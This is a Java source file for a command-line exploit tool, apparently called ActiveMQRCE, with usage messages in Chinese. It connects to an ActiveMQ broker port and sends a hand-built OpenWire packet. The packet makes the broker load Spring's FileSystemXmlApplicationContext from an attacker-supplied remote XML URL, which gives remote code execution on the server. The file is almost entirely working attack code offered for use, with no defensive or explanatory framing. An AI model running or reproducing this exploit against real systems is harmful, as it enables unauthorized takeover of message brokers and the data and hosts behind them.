package org.example;
import javax.jms.*;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Main {

    public static byte[] byteMerger(byte[] bt1, byte[] bt2){
        byte[] bt3 = new byte[bt1.length + bt2.length];
        System.arraycopy(bt1, 0, bt3, 0, bt1.length);
        System.arraycopy(bt2, 0, bt3, bt1.length, bt2.length);
        return bt3;
    }


    /**
     * 字节数组转16进制
     * @param bytes 需要转换的byte数组
     * @return  转换后的Hex字符串
     */
    public static String bytesToHex(byte[] bytes) {
        StringBuffer sb = new StringBuffer();
        for(int i = 0; i < bytes.length; i++) {
            String hex = Integer.toHexString(bytes[i] & 0xFF);
            if(hex.length() < 2){
                sb.append(0);
            }
            sb.append(hex);
        }
        return sb.toString();
    }

    public static void main(String[] args) throws  IOException {
        if (args.length < 3) {
            System.out.println("[!] 请输入目标ip，端口，以及你的xml的url地址");
            System.out.println("[*] java -jar ActiveMQRCE.jar 127.0.0.1 61616 http://127.0.0.1:13443/test.xml ");
            return;
        }
        Socket socket = new Socket(args[0], Integer.parseInt(args[1]));
        OutputStream outputStream = socket.getOutputStream();
        byte[] header = new byte[]{0x1f,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};

        String className = "org.springframework.context.support.FileSystemXmlApplicationContext";
//         "org.springframework.context.support.ClassPathXmlApplicationContext"
        String message = args[2];
        byte[] ClassNameBytes = className.getBytes();
        byte[] messageBytes = message.getBytes();
        byte[] notnull = new byte[]{0x01};
        byte[] classLength = new byte[]{0x00,(byte)(ClassNameBytes.length)};
        byte[] NamePartbytes = byteMerger(classLength, ClassNameBytes);
        byte[] partOne = byteMerger(notnull,NamePartbytes);
        byte[] messageLength = new byte[]{0x00,(byte)(messageBytes.length)};
        byte[] messagePartBytes = byteMerger(messageLength, messageBytes);
        byte[] partTwo = byteMerger(notnull, messagePartBytes);
        byte[] body =byteMerger(notnull,byteMerger(partOne,partTwo));
        byte[] packagelength = new byte[]{0x00,0x00,0x00,(byte)( (header.length + body.length))};
        byte[] payload = byteMerger(packagelength, byteMerger(header, body));
        System.out.println("[*] send payload :" + bytesToHex(payload));
        outputStream.write(payload);
        outputStream.flush();
        InputStream inputStream = socket.getInputStream();
        ByteArrayOutputStream byteArrayOutputStream  = new ByteArrayOutputStream();
        int read;
        while ((read = inputStream.read()) != -1){
            byteArrayOutputStream.write(read);
        }
        System.out.println("[*]receive : "+new String(byteArrayOutputStream.toByteArray()));
        outputStream.close();


    }
}